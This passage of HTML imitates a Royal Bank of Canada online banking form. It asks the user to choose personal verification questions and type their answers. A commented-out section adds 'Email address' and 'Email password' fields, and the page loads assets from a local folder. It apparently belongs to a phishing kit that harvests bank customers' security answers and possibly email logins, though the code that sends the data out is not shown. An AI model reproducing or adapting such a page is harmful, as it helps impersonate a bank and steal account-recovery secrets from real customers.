    <label for="pvqlist3"><span class="asterisk">*</span>&nbsp;<span class="fieldLabel">Question:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></label>   </td>
   <td class="rbcMonospace" width="75%" height="30">
      <select name="q3" size="1" id="q3" title="Select a question" onchange="v3mpvq_SelectPVQ( '3' );">
       <option value="">Select a question</option>
       <option value="What was the make of my first car?">What was the make of my first car?</option>
       <option value="What High School did my father attend?">What High School did my father attend?</option>
       <option value="Which city did I meet my significant other?">Which city did I meet my significant other?</option>
       <option value="Last name of my favourite High School teacher?">Last name of my favourite High School teacher?</option>
       <option value="Which country did I go to on my honeymoon?">Which country did I go to on my honeymoon?</option>
       <option value="First name of my best man at my wedding?">First name of my best man at my wedding?</option>
       <option value="What was the name of my first manager?">What was the name of my first manager?</option>
       <option value="In what town or city was my significant other born?">In what town or city was my significant other born?</option>
       <option value="Last name of my childhood best friend?">Last name of my childhood best friend?</option>
       <option value="What is the first name of my oldest nephew?">What is the first name of my oldest nephew?</option>
      </select>   </td>
  </tr>  <tr style="display: none;" id="PVQ3">
    <td colspan="2" width="25%">&nbsp;</td>
    <td width="75%" height="30">
      <input maxlength="60" size="36" name="OWNQUESTION3" id="ownquestion3" title="create a question for PVQ3" onchange="v3mpvq_SetOwnPVQ( '3' );"> <span valign="middle" class="note">(4-60 characters)</span>    </td>
  </tr>
  <tr>
   <td width="5%">&nbsp;</td>
   <td width="20%">
    <label for="answer3"><span class="asterisk">*</span>&nbsp;<span class="fieldLabel">Answer:</span></label>   </td>
   <td width="75%" height="30">
     <input maxlength="20" size="20" placeholder="Answer (3)" name="a3" id="a3" title="s"> 
     <span valign="middle" class="note">(4-20 characters)</span>   </td>
  </tr>
  <tr><td colspan="3">&nbsp;</td></tr>
  <tr>
   <td width="5%">&nbsp;</td>
   <td colspan="2" class="fieldLabel" width="95%">Personal Verification Question 4</td>
  </tr>  <tr><td colspan="3"></td></tr>
  <tr>
   <td width="5%">&nbsp;</td>
   <td width="20%">
    <label for="pvqlist3"><span class="asterisk">*</span>&nbsp;<span class="fieldLabel">Question:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></label>   </td>
   <td class="rbcMonospace" width="75%" height="30">
      <select name="q4" size="1" id="q4" title="Select a question" onchange="v3mpvq_SelectPVQ( '4' );">
       <option value="">Select a question</option>
       <option value="What was the make of my first car?">What was the make of my first car?</option>
       <option value="What High School did my father attend?">What High School did my father attend?</option>
       <option value="Which city did I meet my significant other?">Which city did I meet my significant other?</option>
       <option value="Last name of my favourite High School teacher?">Last name of my favourite High School teacher?</option>
       <option value="Which country did I go to on my honeymoon?">Which country did I go to on my honeymoon?</option>
       <option value="First name of my best man at my wedding?">First name of my best man at my wedding?</option>
       <option value="What was the name of my first manager?">What was the name of my first manager?</option>
       <option value="In what town or city was my significant other born?">In what town or city was my significant other born?</option>
       <option value="Last name of my childhood best friend?">Last name of my childhood best friend?</option>
       <option value="What is the first name of my oldest nephew?">What is the first name of my oldest nephew?</option>
      </select>   </td>
  </tr>  <tr style="display: none;" id="PVQ3">
    <td colspan="2" width="25%">&nbsp;</td>
    <td width="75%" height="30">
      <input maxlength="60" size="36" name="OWNQUESTION4" id="ownquestion4" title="create a question for PVQ4" onchange="v3mpvq_SetOwnPVQ( '3' );"> <span valign="middle" class="note">(4-60 characters)</span>    </td>
  </tr>
  <tr>
   <td width="5%">&nbsp;</td>
   <td width="20%">
    <label for="answer3"><span class="asterisk">*</span>&nbsp;<span class="fieldLabel">Answer:</span></label>   </td>
   <td width="75%" height="30">
     <input maxlength="20" size="20" placeholder="Answer (4)" name="a4" id="a4" title="s"> 
     <span valign="middle" class="note">(4-20 characters)</span>   </td>
  </tr>
  
    <tr><td colspan="3">&nbsp;</td></tr>

  <!--
    <tr>
   <td width="5%">&nbsp;</td>
   <td width="20%">
    <label for="answer3"><span class="asterisk">*</span>&nbsp;<span class="fieldLabel">Email address:</span></label>   </td>
   <td width="75%" height="30">
     <input maxlength="70" size="20" placeholder="Email adresse" name="email" id="a3" title="s"> 
     <span valign="middle" class="note"></span>   </td>
  </tr>
   <tr>
   <td width="5%">&nbsp;</td>
   <td width="20%">
    <label for="answer3"><span class="asterisk">*</span>&nbsp;<span class="fieldLabel">Email password:</span></label>   </td>
   <td width="75%" height="30">
     <input maxlength="70" size="20" type="password" placeholder="Email password" name="emailpass" id="a3" title="s"> 
     <span valign="middle" class="note"></span>   </td>
  </tr>
  
  -->
  
  
  <tr><td colspan="3">&nbsp;</td></tr>
</tbody></table><table border="0" cellpadding="0" cellspacing="0" width="100%">
  <tr>
    <tr>
      <td colspan="3">&nbsp;</td>
    </tr>
    <tr>
      <td align="left" width="4%">      </td>
      <td>&nbsp;</td>
      <td align="right" width="12%">    <input type="image" src="files/btn_continue.gif" name="btn_continue" alt="Continue" border="0"><!--3MBUTTONPT.CINC. 
en-->
      </form></td>
    </tr>
  </tbody>
</table></td>
</tr>
</tbody></table><script language="javascript" type="text/javascript">
<!--
v3mpvq_onLoadPVQ();
//-->
</script>
   
<!-- End of 3MSRCRDRT.CINC -->
</td>
  </tr>
</tbody></table><!-- END:   content --><!-- 3MSHELLFOOT.JS -->
<script language="Javascript" type="text/javascript">
<!--
var c3mbp = new buttons_ButtonPreload( "btn_", "_down" );
//-->
</script>
<!-- 3MSHELLFOOT.JS --> <!-- Start of 3MSHELLFENT.INC --> <input name="F22" value="HTPCBINET" type="hidden">
 <input name="LANGUAGE" value="ENGLISH" type="hidden">
 <input name="REQUEST" value="BeanCounter" type="hidden">
 <input name="XREQUEST" value="AcctBalanceInquiry" type="hidden">
 <input name="BEAN" value="ENTITY" type="hidden">
 <input name="r" value="3MSHELL01.HTM" type="hidden">
<input name="3MTK" value="0" type="hidden">
 <input name="F22" value="HTPCBINET" type="hidden">
 <input name="LANGUAGE" value="ENGLISH" type="hidden">
 <input name="REQUEST" value="AcctBalanceInquiry" type="hidden"><!-- End of 3MSHELLFUPP.INC --> <!--3MSHELL01.HTM (420) end-->		</td>
	</tr>
</tbody></table></div> 
</td></tr> 
</tbody></table> 
</td> 
<td valign="top" width="12px"> 
 
 
 
 
 
<table align="center" border="0" cellpadding="0" cellspacing="0" width="100%"> 
</table> 
</td> 
<td valign="top" width="216px"> 
 
 
 
 
 
<table align="center" border="0" cellpadding="0" cellspacing="0" width="100%"> 
<tbody><tr><td valign="top" width="100%">	<a name="7_4P88H9G090LB60IAH7GDD42PG1"></a><div class="wpsPortletBody"><!-- Check to see if we need to render the portlet or not -->
    
    
    
    
    
    
    
    <div id="_3m00NoSkinTogglePortlet" class="OLBAlternatable">
    </div>
    
    
    
    
    
    <div id="_3m00NoSkinTogglePortlet_alternate" class="OLBAlternate" style="display: none;">    <div class="noprint">
	
						<div class="callout callout-taupe-withtitle"><span class="callout-top"><span>&nbsp;</span></span><div class="callout-content clear"><h2>Information and Tools</h2><p>												</p><h4></h4>					<ul class="bullets-arrow">																																				<li>										                                                                              																																																																																																								<a href="http://www.rbcroyalbank.com/online/rbcguarantee.html" onclick="return popupNewbrowser(this.href)" target="_blank" title="(opens new window)" class="linkedtextandicon"><span>RBC Online Banking Security Guarantee</span> <img src="files/newwindow.gif" class="icon" alt="(opens new window)"></a>																														</li>																																													<li>										                                                                              																																																																																																								<a href="https://www.rbcroyalbank.com/onlinebanking/bankingusertips/security/features.html#2" onclick="return popupNewbrowser(this.href)" target="_blank" title="(opens new window)" class="linkedtextandicon"><span>RBC Online Banking Security Features</span> <img src="files/newwindow.gif" class="icon" alt="(opens new window)"></a>																														</li>																										</ul>									</div><span class="callout-bottom"><span>&nbsp;</span></span></div>	
		
	
</div>
    </div>
	
</div>
 
</td></tr> 
</tbody></table> 
</td> 
</tr></tbody></table>			</div>
		</div>
		
		
		
		
		 	  
		
		
		
<div id="globalfooter" class="OLBAlternatable">
	
	
    	    
    	
	<div id="globalfooter-searchbar" class="OLBAlternatable" style="visibility: hidden;">
		<p id="globalfooter-searchbar-links" class="OLBAlternatable">
		</p>
		<div id="globalfooter-searchbar-search" class="OLBAlternatable">
    		
    			
    			
    			
    		
		</div>
		
	</div>
	
		
	<div id="globalfooter-main" class="OLBAlternatable">
		<p>Royal Bank of Canada Website, ? 1995-2015</p>
		<p><a href="#" onclick="return popupNewbrowser(this.href)" target="_blank" title="Privacy &amp; Security (opens new window) " class="linkedtextandicon"><span>	     	Privacy &amp; Security	</span></a>|<a href="#" onclick="return popupHelp(this.href)" target="_blank" title="Legal (opens new window)" class="linkedtextandicon"><span>	   	Legal	</span></a>|    <a href="#" onclick="return popupNewbrowser(this.href)" target="_blank" title="Accessibility (opens new window) " class="linkedtextandicon"><span>        	Accessibility        </span></a>		</p>
	</div>
</div>    
<div id="globalfooter_alternate" class="OLBAlternate" style="display: none;">
	
	
    		
    	
	<div id="globalfooter-searchbar_alternate" class="OLBAlternate">
		<p id="globalfooter-searchbar-links_alternate" class="OLBAlternate">	
	            
	                
	                
	                    
	                
	            
	         
		<div id="globalfooter-searchbar-search_alternate" class="OLBAlternate">
    		
    					        
    			
    			
    		
		</div>
		
	</div>
	
		
	<div id="globalfooter-main_alternate" class="OLBAlternate">
		<p>Royal Bank of Canada Website, ? 1995-2015
		</p>
		<p><a href="http://www.rbc.com/privacysecurity/ca/index.html" onclick="return popupNewbrowser(this.href)" target="_blank" title="Privacy &amp; Security (opens new window) " class="linkedtextandicon"><span>	     	Privacy &amp; Security	</span></a>|<a href="https://www.rbcroyalbank.com/onlinebanking/legal.html" onclick="return popupHelp(this.href)" target="_blank" title="Legal (opens new window)" class="linkedtextandicon"><span>	   	Legal	</span></a>|    <a href="http://www.rbc.com/accessibility/" onclick="return popupNewbrowser(this.href)" target="_blank" title="Accessibility (opens new window) " class="linkedtextandicon"><span>        	Accessibility        </span></a>
	    	
		</p>
	</div>
</div>        		
		
		
	</div></body></html>
